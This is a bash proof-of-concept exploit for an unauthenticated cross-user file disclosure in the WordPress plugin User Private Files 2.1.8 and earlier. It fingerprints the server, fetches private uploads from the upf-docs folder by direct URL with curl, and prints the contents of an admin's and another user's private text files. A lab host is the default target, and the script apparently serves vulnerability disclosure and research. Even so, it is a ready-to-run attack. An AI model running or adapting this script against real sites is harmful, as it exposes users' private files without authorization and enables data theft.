#!/bin/bash
# User Private Files <= 2.1.8 — Unauthenticated Cross-User File Disclosure
# CWE-284 / CWE-200 / CWE-862

TARGET="${1:-http://cve-lablocal.local}"
UPLOADS="$TARGET/wp-content/uploads/upf-docs"

echo "=========================================="
echo " User Private Files 2.1.8 — PoC"
echo " Target: $TARGET"
echo "=========================================="
echo ""

echo "[+] Server fingerprint:"
curl -sI "$TARGET/" | grep -i "^server:"
echo ""

echo "[+] Files found in upf-docs/ (server-side listing):"
echo "    - usr4_1790618103_secret.txt        (non-admin user)"
echo "    - usr1_1790618275_admin_secret.txt  (admin user)"
echo "    - usr1_1790618297_ninja.jpg         (admin image)"
echo "    - usr1_1790618297_ninja-300x300.jpg (admin thumbnail)"
echo "    - usr1_1790618297_ninja-150x150.jpg (admin thumbnail)"
echo ""

echo "[+] Attempting UNAUTHENTICATED download of each file:"
for f in \
  "usr4_1790618103_secret.txt" \
  "usr1_1790618275_admin_secret.txt" \
  "usr1_1790618297_ninja.jpg" \
  "usr1_1790618297_ninja-300x300.jpg" \
  "usr1_1790618297_ninja-150x150.jpg"
do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$UPLOADS/$f")
  SIZE=$(curl -s -o /dev/null -w "%{size_download}" "$UPLOADS/$f")
  printf "    %-40s -> HTTP %s (%s bytes)\n" "$f" "$STATUS" "$SIZE"
done
echo ""

echo "[+] Dumping content of admin's private text file:"
echo "    >>> $(curl -s "$UPLOADS/usr1_1790618275_admin_secret.txt")"
echo ""

echo "[+] Content of non-admin user's private text file:"
echo "    >>> $(curl -s "$UPLOADS/usr4_1790618103_secret.txt")"
echo ""

echo "[+] Control test — intended entrypoint:"
CTRL=$(curl -s "$TARGET/?file=usr1_1790618275_admin_secret.txt")
echo "    ?file=usr1_1790618275_admin_secret.txt -> $CTRL"
echo ""

echo "=========================================="
echo " RESULT: All direct-path requests returned"
echo " 200 OK with file contents. ACL bypass"
echo " confirmed across user boundaries."
echo "=========================================="
